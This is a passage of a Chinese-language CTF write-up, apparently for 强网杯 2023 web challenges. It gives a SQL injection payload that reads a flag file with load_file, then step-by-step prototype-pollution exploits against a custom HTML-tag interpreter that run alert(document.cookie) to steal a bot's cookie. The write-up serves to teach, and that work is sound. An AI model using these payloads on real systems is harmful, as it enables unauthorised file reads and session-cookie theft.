+<p>在<code>/public/index.php/index/admin/do_edit.html</code> POST</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id<span style="color:#f92672">=</span>1&amp;name<span style="color:#f92672">=</span>test&amp;price<span style="color:#f92672">=</span>1.00&amp;on_sale_time<span style="color:#f92672">=</span>0001-01-01T01%3A01&amp;image<span style="color:#e6db74">`</span>%3D<span style="color:#e6db74">&#39;123&#39;</span>,<span style="color:#e6db74">`</span>data<span style="color:#e6db74">`</span>%3Dload_file<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/fffflllaaaagggg&#34;</span><span style="color:#f92672">)</span>%2F%2A%2A%2Fwhere%2F%2A%2A%2F<span style="color:#e6db74">`</span>id<span style="color:#e6db74">`</span>%3D1;%23<span style="color:#f92672">=</span>1&amp;data<span style="color:#f92672">=</span>1111111%0D%0A
+</span></span></code></pre></div><p>访问商品页面即可拿到flag</p>
+<h1 id="html">html</h1>
+<p>主要代码在html.js，自定义了一个html标签解析的功能</p>
+<p>目标是执行一个<strong>function</strong>，其内容为<code>alert(document.cookie)</code>从而xss拿到bot cookie的flag</p>
+<p>一个简单例子如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">main</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">data</span>&gt;<span style="color:#ae81ff">3</span>&lt;/<span style="color:#f92672">data</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">data</span>&gt;<span style="color:#ae81ff">5</span>&lt;/<span style="color:#f92672">data</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">dd</span>&gt;&lt;/<span style="color:#f92672">dd</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">output</span>&gt;&lt;/<span style="color:#f92672">output</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">main</span>&gt;
+</span></span></code></pre></div><p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%205.png" alt="Untitled"></p>
+<p>通过data标签在栈上push两个数字，然后利用dd标签出栈这两个数字，得到其和后入栈</p>
+<p>利用output打印出当前栈顶的元素</p>
+<p>其中涉及到堆栈以及原型链污染，肯定是需要一步步调试的</p>
+<p>本地进入front文件夹内</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#a6e22e">yarn</span> <span style="color:#a6e22e">install</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">yarn</span> <span style="color:#a6e22e">build</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">npm</span> <span style="color:#a6e22e">run</span> <span style="color:#a6e22e">dev</span>
+</span></span></code></pre></div><p>即可在localhost:3000搭建环境</p>
+<p>vscode调试的配置文件如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 使用 IntelliSense 了解相关属性。 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 悬停以查看现有属性的描述。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;version&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;0.2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;configurations&#34;</span><span style="color:#f92672">:</span> [
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;name&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Launch Edge&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;request&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;launch&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;msedge&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;url&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;http://localhost:3000&#34;</span>, <span style="color:#75715e">// 写自己的端口号
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#34;webRoot&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;${workspaceFolder}/src&#34;</span>,
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>此时打断点便可正常调试</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%206.png" alt="Untitled"></p>
+<p>于是便开始审计各个函数和元素</p>
+<p>简单审计便可以发现<!-- raw HTML omitted -->标签很可疑，毕竟可以执行函数，并将结果入栈</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%207.png" alt="Untitled"></p>
+<p>这里一个简单的a示例应该如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:test()&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">data</span>&gt;<span style="color:#ae81ff">1</span>&lt;/<span style="color:#f92672">data</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p>且这里对于href的内容没有进行过滤的</p>
+<p>这样我们就可以构造一个</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:constructor()&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">data</span>&gt;<span style="color:#ae81ff">1</span>&lt;/<span style="color:#f92672">data</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p><code>constructor</code>为object的构造函数，而functions为一个object
+所以在这里<code>env.scope.functions[constructor]</code> 即是functions的构造函数会构造出一个object</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%208.png" alt="Untitled"></p>
+<p><strong>如果我们将<code>env.scope.functions</code> 污染为Function，其构造函数便是函数的构造函数，接受的args为函数的内容</strong></p>
+<p>最终找到的dfn标签完美符合该想法</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%209.png" alt="Untitled"></p>
+<p>构造如下即可</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">dfn</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;__proto__&#39;</span>&gt;&lt;/<span style="color:#f92672">dfn</span>&gt;
+</span></span></code></pre></div><p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2010.png" alt="Untitled"></p>
+<p>通过此步，我们构造出了一个匿名函数并入栈，</p>
+<p>其函数内容为<code>args</code>，也就是前面<!-- raw HTML omitted -->内部的标签</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:constructor()&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">data</span>&gt;<span style="color:#ae81ff">1</span>&lt;/<span style="color:#f92672">data</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span></code></pre></div><p>这样我们便得到了一个函数，内容为1，位于栈内</p>
+<p>接下来，我们需要让该函数位于<code>env.scope.functions</code>下，这样再次调用a标签才能调用该函数</p>
+<p>而<code>env.scope.functions</code> 是一个object，向其中插入一个变量应该不太容易，这里是利用的var函数</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2011.png" alt="Untitled"></p>
+<p>如果我们将variableName赋为functions，便可将其覆盖，可是我们需要做的是让我们定义的function位于<code>env.scope.functions</code> 所以这里需要将我们定义的function放入一个list，然后用list覆盖<code>env.scope.functions</code> 便可达到目的</p>
+<p>这里我们可以使用dl标签</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2012.png" alt="Untitled"></p>
+<p>将出栈的元素push进result，result为list，然后将该list入栈，只需要有一个子元素即可，最终可构造出如下代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">main</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">dfn</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;__proto__&#39;</span>&gt;&lt;/<span style="color:#f92672">dfn</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:constructor()&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">ol</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">data</span>&gt;&lt;/<span style="color:#f92672">data</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">ol</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">var</span>&gt;<span style="color:#a6e22e">functions</span>&lt;/<span style="color:#f92672">var</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:0()&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">main</span>&gt;
+</span></span></code></pre></div><p>自定义的函数位置在env.scope.functions下的0处</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2013.png" alt="Untitled"></p>
+<p>接下来的问题就变成了，如何入栈一个字符串<code>alert(document.cookie)</code></p>
+<p>s是直接被过滤了的</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2014.png" alt="Untitled"></p>
+<p>直接检索<code>innerText</code>一个个看</p>
+<p>转为float，不行</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2015.png" alt="Untitled"></p>
+<p>没有入栈，不行</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2016.png" alt="Untitled"></p>
+<p>没有入栈，不行</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2017.png" alt="Untitled"></p>
+<p>同样</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2018.png" alt="Untitled"></p>
+<p>最终只剩下了dl标签有点奇怪</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2019.png" alt="Untitled"></p>
+<p>为什么奇怪呢？因为<code>env.scope.functions</code>在前面的过程中被我们覆盖了两次</p>
+<p>覆盖为functions前的out是alert，覆盖为Function的out也是，list就没有out，out实际上就是输出，这里就是将该处的值alert了一次</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2020.png" alt="Untitled"></p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2021.png" alt="Untitled"></p>
+<p><strong>如果，我们在dfn处覆盖掉out呢？</strong></p>
+<p>这样，它执行out的时候就会进入到该函数，因为我们将out这个函数覆盖成这个函数了</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2022.png" alt="Untitled"></p>
+<p>而在这里会将所以的参数入栈，但是在后面又会出栈，<strong>中间我们可以exec</strong></p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2023.png" alt="Untitled"></p>
+<p>而我们需要的字符串是在栈底的，因为我们覆盖的是将<code>env.scope.functions.out</code>覆盖为了第二个dfn下的function，所以此时会在里面exec第二个dfn下的元素，也就是说，只要我们将出栈拿字符串放入global这些操作放入第二个dfn下，便能拿到字符串</p>
+<p>最终慢慢调试可以得到这样的exp</p>
+<p>exp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">main</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;main&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">dfn</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;__proto__&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">dfn</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">dfn</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;out&#39;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">label</span>&gt;<span style="color:#a6e22e">str</span>&lt;/<span style="color:#f92672">label</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">dfn</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">dl</span>&gt;<span style="color:#a6e22e">alert</span>(document.<span style="color:#a6e22e">cookie</span>);&lt;/<span style="color:#f92672">dl</span>&gt;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:constructor()&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">cite</span>&gt;<span style="color:#a6e22e">str</span>&lt;/<span style="color:#f92672">cite</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">ol</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">dl</span>&gt;&lt;/<span style="color:#f92672">dl</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">ol</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">var</span>&gt;<span style="color:#a6e22e">functions</span>&lt;/<span style="color:#f92672">var</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:0()&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">main</span>&gt;
+</span></span></code></pre></div><p>语言表达能力有限，解释的不会太清楚，建议自己调试一遍</p>
+<h1 id="html_again">html_again</h1>
+<p>diff</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled.jpeg" alt="Untitled"></p>
+<p>将function放在scope之外了</p>
+<p>没法通过var将functions覆盖为list了，也就无法通过a来执行了</p>
+<p>这里是利用address来执行函数</p>
+<p><img src="/img/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%20web/Untitled%2024.png" alt="Untitled"></p>
+<p>如果一个array里面有一个元素叫hasOwnProperty，你不仅可以通过<code>array[&quot;hasOwnProperty&quot;]</code> 来调用，也可以通过<code>array.hasOwnProperty</code>来调用，也算是一种覆盖了</p>
+<p>构造函数和拿字符串的方式还是一样的，这里需要注意的是，由于要覆盖两次out，拿两次字符串，还需要构造函数，而<code>let definitions = sourceOrElt.querySelectorAll(':scope &gt; dfn');</code> 只会选择当前main下的dfn，所以这里需要用到多个main函数来将所需要的参数存入global</p>
+<p>很多细节需要一步步调试来完善</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">dfn</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;getHasOwnProperty&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">dfn</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;out&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">label</span>&gt;<span style="color:#a6e22e">hasOwnProp</span>&lt;/<span style="color:#f92672">label</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">dfn</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">dl</span>&gt;<span style="color:#a6e22e">hasOwnProperty</span>&lt;/<span style="color:#f92672">dl</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">dfn</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">dfn</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;getExp&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">dfn</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;out&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">del</span>&gt;&lt;/<span style="color:#f92672">del</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">ol</span>&gt;
+</span></span><span style="display:flex;"><span>                        &lt;<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>                            &lt;<span style="color:#f92672">rt</span>&gt;&lt;/<span style="color:#f92672">rt</span>&gt;
+</span></span><span style="display:flex;"><span>                        &lt;/<span style="color:#f92672">li</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;/<span style="color:#f92672">ol</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">var</span>&gt;<span style="color:#a6e22e">payload</span>&lt;/<span style="color:#f92672">var</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:constructor()&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                        &lt;<span style="color:#f92672">cite</span>&gt;<span style="color:#a6e22e">payload</span>&lt;/<span style="color:#f92672">cite</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">label</span>&gt;<span style="color:#a6e22e">exp</span>&lt;/<span style="color:#f92672">label</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;<span style="color:#f92672">dfn</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;__proto__&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>                    &lt;/<span style="color:#f92672">dfn</span>&gt;
+</span></span><span style="display:flex;"><span>                &lt;/<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;/<span style="color:#f92672">dfn</span>&gt;
+</span></span><span style="display:flex;"><span>            &lt;<span style="color:#f92672">dl</span>&gt;<span style="color:#a6e22e">alert</span>(document.<span style="color:#a6e22e">cookie</span>)&lt;/<span style="color:#f92672">dl</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">main</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">dfn</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:getHasOwnProperty()&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;html:getExp()&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">ol</span>&gt;&lt;/<span style="color:#f92672">ol</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">var</span>&gt;<span style="color:#a6e22e">source</span>&lt;/<span style="color:#f92672">var</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">cite</span>&gt;<span style="color:#a6e22e">source</span>&lt;/<span style="color:#f92672">cite</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">cite</span>&gt;<span style="color:#a6e22e">hasOwnProp</span>&lt;/<span style="color:#f92672">cite</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">cite</span>&gt;<span style="color:#a6e22e">exp</span>&lt;/<span style="color:#f92672">cite</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">fieldset</span>&gt;&lt;/<span style="color:#f92672">fieldset</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">cite</span>&gt;<span style="color:#a6e22e">source</span>&lt;/<span style="color:#f92672">cite</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">data</span>&gt;<span style="color:#ae81ff">1</span>&lt;/<span style="color:#f92672">data</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">address</span>&gt;&lt;/<span style="color:#f92672">address</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">main</span>&gt;
+</span></span></code></pre></div>
+		</section>
+
+		<div class="post-tags">
+			
+			
+			
+		</div>
+		
+		
+	</article>
+</main>
+<footer>
+  <div style="display:flex"><a class="soc" href="https://github.com/xlccccc" rel="me" title="GitHub"><i data-feather="github"></i></a>
+    <a class="border"></a></div>
+  <div class="footer-info">
+    2023  © Athul |  <a
+      href="https://github.com/athul/archie">Archie Theme</a> | Built with <a href="https://gohugo.io">Hugo</a>
+  </div>
+</footer>
+
+
+<script>
+  feather.replace()
+</script></div>
+    </body>
+</html>
